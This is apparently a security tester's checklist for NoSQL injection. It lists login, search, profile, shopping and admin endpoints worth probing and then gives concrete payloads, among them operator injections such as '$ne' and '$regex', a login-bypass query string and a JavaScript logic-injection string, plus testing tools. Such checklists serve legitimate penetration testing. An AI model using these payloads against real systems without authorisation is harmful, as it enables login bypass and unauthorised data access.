## Focus: MongoDB, CouchDB, Firebase, DynamoDB, etc.

---

## Authentication & Login Fields
- [ ] POST /login → `username`
- [ ] POST /login → `password`
- [ ] POST /auth → `email`
- [ ] POST /auth → `identifier`
- [ ] POST /signin → `login`
- [ ] /reset-password → `token`
- [ ] /validate → `otp`
- [ ] /verify → `code`
- [ ] /auth/social → `social_id`
- [ ] JWT decoded payload passed into NoSQL query

---

## Search / Filter Endpoints
- [ ] GET /search?q=
- [ ] GET /items?filter=
- [ ] GET /users?name=
- [ ] POST /lookup → `keyword`
- [ ] GET /products?q[name]=
- [ ] GET /clients?email=
- [ ] POST /search → `query`
- [ ] GET /records?where=
- [ ] POST /events/filter → `criteria`
- [ ] GET /browse?term=

---

## Profile and Account Settings
- [ ] /profile → `username`
- [ ] /account → `email`
- [ ] /user → `phone`
- [ ] /settings → `nickname`
- [ ] /preferences → `userid`
- [ ] /notifications → `user_id`
- [ ] /subscriptions → `plan`
- [ ] /friends → `friend_name`
- [ ] /follow → `target_user`
- [ ] /unfollow → `user_id`

---

## E-commerce & Product Data
- [ ] /cart → `product_id`
- [ ] /order → `customer_id`
- [ ] /checkout → `shipping_address`
- [ ] /invoice → `reference_number`
- [ ] /product/review → `sku`
- [ ] /wishlist → `item`
- [ ] /inventory → `name`
- [ ] /store → `location`
- [ ] /discount → `coupon_code`
- [ ] /return → `order_id`

---

## Admin & Internal Panels
- [ ] /admin/user → `username`
- [ ] /admin/audit → `log_type`
- [ ] /admin/search → `query`
- [ ] /logs → `filter`
- [ ] /dashboard → `report_id`
- [ ] /admin/activity → `userid`
- [ ] /admin/lookup → `record_id`
- [ ] /debug → `trace_id`
- [ ] /internal/export → `file`
- [ ] /internal/import → `filter`

---

## NoSQL Injection Payload Testing Tips
- [ ] Test with: `{"$ne": null}`, `{"$gt": ""}`, `{"$regex": ".*"}`
- [ ] URL-encode payloads: `%24ne`, `%24gt`, `%24regex`
- [ ] Try nested queries: `{"username": {"$ne": "admin"}}`
- [ ] Bypass login: `username[$ne]=1&password[$ne]=1`
- [ ] Test logic injection: `admin' && this.password.match(/.*/)//`

---

## Watch for:
- [ ] APIs accepting JSON input (`Content-Type: application/json`)
- [ ] Loose filters in NoSQL drivers (Node.js `find()`, `where()`)
- [ ] Implicit type coercion in MongoDB (e.g., regex vs string)
- [ ] Lack of server-side validation before NoSQL query building

---

## Bonus: Useful Tools & Wordlists
- [ ] **NoSQLMap**
- [ ] **Burp JSON Intruder templates**
- [ ] **SecLists → nosql.txt**
- [ ] **WFuzz with JSON templates**
- [ ] **PayloadAllTheThings: NoSQL Injection**

---
